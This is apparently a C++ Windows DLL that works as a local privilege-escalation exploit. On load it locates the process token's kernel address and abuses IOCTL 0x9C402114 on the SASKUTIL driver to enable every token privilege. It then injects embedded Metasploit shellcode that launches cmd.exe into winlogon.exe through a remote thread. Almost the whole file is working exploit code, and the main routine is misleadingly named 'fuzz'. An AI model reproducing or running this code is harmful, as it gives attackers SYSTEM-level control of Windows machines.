// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <Windows.h>



// PCAPGETSHELL.cpp : Defines the entry point for the console application.
//

#include <stdio.h>
#include <tchar.h>
#include<Windows.h>
#include<stdio.h>
#include <winternl.h>
#include <intrin.h>
#include <psapi.h>
#include <strsafe.h>
#include <assert.h>
#include <TlHelp32.h>

#include<Accctrl.h>
#include<Aclapi.h>

#pragma comment(lib,"advapi32.lib")





void DbgPrintA(LPCSTR lpszFormat, ...)
{
	va_list   args;
	CHAR     szBuffer[0x4000];
	va_start(args, lpszFormat);
	wvsprintfA(szBuffer, lpszFormat, args);
	OutputDebugStringA(szBuffer);
	va_end(args);

}




#define SL_IOCTL_GET_EVENT_NAME CTL_CODE(0x8000, 1, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)
/* found with :
!token 
1: kd> dt nt!_OBJECT_HEADER
+0x000 PointerCount     : Int4B
+0x004 HandleCount      : Int4B
+0x004 NextToFree       : Ptr32 Void
+0x008 Lock             : _EX_PUSH_LOCK
+0x00c TypeIndex        : UChar
+0x00d TraceFlags       : UChar
+0x00e InfoMask         : UChar
+0x00f Flags            : UChar
+0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION
+0x010 QuotaBlockCharged : Ptr32 Void
+0x014 SecurityDescriptor : Ptr32 Void
+0x018 Body             : _QUAD
TypeIndex is 0x5
*/
#define HANDLE_TYPE_TOKEN 0x5
// Undocumented SYSTEM_INFORMATION_CLASS: SystemHandleInformation
const SYSTEM_INFORMATION_CLASS SystemHandleInformation = 
(SYSTEM_INFORMATION_CLASS)16;
// The NtQuerySystemInformation function and the structures that it returns 
// are internal to the operating system and subject to change from one 
// release of Windows to another. To maintain the compatibility of your 
// application, it is better not to use the function.
typedef NTSTATUS (WINAPI * PFN_NTQUERYSYSTEMINFORMATION)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);
// Undocumented structure: SYSTEM_HANDLE_INFORMATION
typedef struct _SYSTEM_HANDLE 
{
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;
typedef struct _SYSTEM_HANDLE_INFORMATION 
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
// Undocumented FILE_INFORMATION_CLASS: FileNameInformation
const FILE_INFORMATION_CLASS FileNameInformation = 
(FILE_INFORMATION_CLASS)9;
// The NtQueryInformationFile function and the structures that it returns 
// are internal to the operating system and subject to change from one 
// release of Windows to another. To maintain the compatibility of your 
// application, it is better not to use the function.
typedef NTSTATUS (WINAPI * PFN_NTQUERYINFORMATIONFILE)(
	IN HANDLE FileHandle,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass
	);
// FILE_NAME_INFORMATION contains name of queried file object.
typedef struct _FILE_NAME_INFORMATION {
	ULONG FileNameLength;
	WCHAR FileName[1];
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;



DWORD FindTokenAddressHandles(ULONG pid)
{
	/////////////////////////////////////////////////////////////////////////
	// Prepare for NtQuerySystemInformation and NtQueryInformationFile.
	// 
	// The functions have no associated import library. You must use the 
	// LoadLibrary and GetProcAddress functions to dynamically link to 
	// ntdll.dll.
	HINSTANCE hNtDll = LoadLibrary(_T("ntdll.dll"));
	assert(hNtDll != NULL);
	PFN_NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = 
		(PFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtDll, 
		"NtQuerySystemInformation");
	assert(NtQuerySystemInformation != NULL);
	/////////////////////////////////////////////////////////////////////////
	// Get system handle information.
	// 
	DWORD nSize = 4096, nReturn;
	PSYSTEM_HANDLE_INFORMATION pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION) HeapAlloc(GetProcessHeap(), 0, nSize);
	// NtQuerySystemInformation does not return the correct required buffer 
	// size if the buffer passed is too small. Instead you must call the 
	// function while increasing the buffer size until the function no longer 
	// returns STATUS_INFO_LENGTH_MISMATCH.
	while (NtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, 
		nSize, &nReturn) == STATUS_INFO_LENGTH_MISMATCH)
	{
		HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
		nSize += 4096;
		pSysHandleInfo = (SYSTEM_HANDLE_INFORMATION*)HeapAlloc(
			GetProcessHeap(), 0, nSize);
	}
	for (ULONG i = 0; i < pSysHandleInfo->NumberOfHandles; i++)
	{
		PSYSTEM_HANDLE pHandle = &(pSysHandleInfo->Handles[i]);
		if (pHandle->ProcessId == pid && pHandle->ObjectTypeNumber == HANDLE_TYPE_TOKEN)
		{
			DbgPrintA(" ObjectTypeNumber %d , ProcessId %d , Object  %p \r\n",pHandle->ObjectTypeNumber,pHandle->ProcessId,pHandle->Object);
			return (DWORD)pHandle->Object;
		}
	}
	/////////////////////////////////////////////////////////////////////////
	// Clean up.
	// 
	HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
	return 0;
}









DWORD getProcessId(char* process)
{
	HANDLE          hSnapShot;
	PROCESSENTRY32  pe32;
	DWORD           pid;


	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapShot == INVALID_HANDLE_VALUE) 
	{
		DbgPrintA("\n[-] Failed to create handle CreateToolhelp32Snapshot()\n\n");
		return -1;
	} 

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapShot, &pe32) == FALSE)
	{
		DbgPrintA("\n[-] Failed to call Process32First()\n\n");
		return -1;
	}

	do
	{
		if (lstrcmpi(pe32.szExeFile, process) == 0)
		{
			pid = pe32.th32ProcessID;
			return pid;
		}
	} while (Process32Next(hSnapShot, &pe32));

	CloseHandle(hSnapShot);
	return 0;
}

int spawnShell()
{
	// windows/exec - 192 bytes http://www.metasploit.com
	// VERBOSE=false, PrependMigrate=false, EXITFUNC=thread, CMD=cmd.exe

	char shellcode[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50" 
		"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" 
		"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7" 
		"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78" 
		"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3" 
		"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01" 
		"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58" 
		"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3" 
		"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a" 
		"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d" 
		"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb" 
		"\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c" 
		"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53" 
		"\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

	char*     process = "winlogon.exe";
	DWORD     pid;
	HANDLE    hProcess;
	HANDLE    hThread;
	LPVOID    ptrtomem;


	pid = getProcessId(process);

	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
	{
		DbgPrintA("\n[-] Unable to open %s process\n\n", process);
		return -1;
	}
	DbgPrintA("\n[+] Opened %s process pid=%d with PROCESS_ALL_ACCESS rights", process, pid);

	if ((ptrtomem = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
	{
		DbgPrintA("\n[-] Unable to allocate memory in target process\n\n");
		return -1;
	}
	DbgPrintA("\n[+] Memory allocated at address 0x%p", ptrtomem);

	if (!(WriteProcessMemory(hProcess, (LPVOID)ptrtomem, shellcode, sizeof(shellcode), NULL)))
	{
		DbgPrintA("\n[-] Unable to write to process memory\n\n");
		return -1;
	}
	DbgPrintA("\n[+] Written to allocated process memory");

	if ((hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)ptrtomem, NULL, 0, NULL)) == NULL)
	{
		CloseHandle(hThread);
		DbgPrintA("\n[-] Unable to create remote thread\n\n");
		return -1;
	}
	DbgPrintA("\n[+] Created remote thread and executed\n\n");  


	return 0;
}

void fuzz()
{
	DWORD      PresentByteOffset;
	DWORD      EnableByteOffset;
	DWORD      TokenAddressTarget; 

	DWORD dwBytesReturned;
	HANDLE token;
	// first create toke handle so find  object address with handle 
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&token))
		DebugBreak();
	DWORD TokenAddress = FindTokenAddressHandles(GetCurrentProcessId());


	DbgPrintA("\n[i] Address of current process token 0x%p\n", TokenAddress);


	TokenAddressTarget = TokenAddress + 0x40;
	PresentByteOffset = TokenAddressTarget + 2;
	EnableByteOffset = TokenAddressTarget + 0xb;

	DbgPrintA("%x %x %x\n", TokenAddressTarget, PresentByteOffset, EnableByteOffset);

	HANDLE hDriver = CreateFileA("\\\\.\\SASKUTIL",GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hDriver!=INVALID_HANDLE_VALUE)
	{
		char *pSendBuf = new char[0x2904];

		memset(pSendBuf, 0x0, 0x2904);

		*(DWORD*)(pSendBuf+0x24) = PresentByteOffset;
		*(DWORD*)(pSendBuf+0x28) = 0xffffffff;



		DbgPrintA(" Open Driver OK\n");
		if (!DeviceIoControl(hDriver, 0x9C402114, (LPVOID)pSendBuf, 0x2904, (LPVOID)pSendBuf, 0x2904,&dwBytesReturned, NULL))
		{
			DbgPrintA("send IOCTL error %d.\n",GetLastError());
			return;
		}
		else  DbgPrintA(" Send IOCTL PresentByteOffset OK\n");


		*(DWORD*)(pSendBuf+0x24) = EnableByteOffset;
		*(DWORD*)(pSendBuf+0x28) = 0xffffffff;
		if (!DeviceIoControl(hDriver, 0x9C402114, (LPVOID)pSendBuf, 0x2904, (LPVOID)pSendBuf,0x2904,&dwBytesReturned, NULL))
		{
			DbgPrintA("send IOCTL error %d.\n",GetLastError());
			return;
		}
		else  DbgPrintA(" Send IOCTL EnableByteOffset OK\n");

	}
	else 
	{
		DbgPrintA(" Open Driver error %d.\n",GetLastError());
		return;
	}
	CloseHandle(hDriver);
	CloseHandle(token);

	spawnShell();
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)fuzz, NULL, NULL, NULL);
			break;
		}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

